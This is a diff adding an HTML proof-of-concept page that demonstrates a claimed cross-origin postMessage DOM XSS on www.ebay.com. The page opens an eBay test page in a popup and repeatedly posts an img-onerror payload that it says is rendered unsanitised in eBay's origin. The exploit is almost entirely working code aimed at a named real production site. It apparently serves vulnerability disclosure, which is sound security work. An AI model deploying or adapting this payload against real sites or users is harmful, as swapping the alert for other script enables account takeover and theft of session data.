@@ -1,0 +1,46 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>eBay postMessage XSS PoC</title>
+<style>
+ body{font-family:system-ui,Arial,sans-serif;max-width:640px;margin:48px auto;padding:0 16px;color:#222}
+ h2{color:#0654ba}
+ button{font-size:18px;padding:12px 26px;background:#0654ba;color:#fff;border:0;border-radius:6px;cursor:pointer}
+ code{background:#f3f3f3;padding:2px 5px;border-radius:3px;font-size:13px}
+ .note{color:#666;font-size:14px;margin-top:22px;line-height:1.5}
+ #log{margin-top:18px;font:13px/1.4 monospace;color:#444;white-space:pre-wrap}
+</style>
+</head>
+<body>
+<h2>Security PoC — postMessage DOM XSS on www.ebay.com</h2>
+<p>One click opens <code>https://www.ebay.com/buyer-preferences/test</code> and sends a
+cross-origin <code>postMessage</code>. The page's message listener has no origin check and
+renders the <code>type</code> field via <code>dangerouslySetInnerHTML</code>, so the payload
+executes in the <b>www.ebay.com</b> origin.</p>
+
+<button id="go">Open eBay &amp; fire XSS</button>
+<div id="log"></div>
+
+<p class="note">Expected: a popup loads eBay's "Test Page", then an <code>alert()</code> showing
+<b>www.ebay.com</b> fires inside that popup (arbitrary JS executed in eBay's origin, delivered
+cross-origin from this page). The one click is only needed so the browser allows the popup.</p>
+
+<script>
+var PAYLOAD = { type: "<img src=x onerror=alert('XSS in '+document.domain)>" };
+function log(m){ document.getElementById('log').textContent += m + "\n"; }
+document.getElementById('go').onclick = function () {
+  var w = window.open('https://www.ebay.com/buyer-preferences/test', 'eb');
+  if (!w) { log('[!] popup blocked — allow popups for this site and retry'); return; }
+  log('[*] opened eBay test page; posting payload every 500ms …');
+  var n = 0;
+  var t = setInterval(function () {
+    try { w.postMessage(PAYLOAD, '*'); n++; log('[+] postMessage #' + n + ' sent'); }
+    catch (e) { log('[!] ' + e); }
+  }, 500);
+  setTimeout(function () { clearInterval(t); log('[*] done.'); }, 10000);
+};
+</script>
+</body>
+</html>
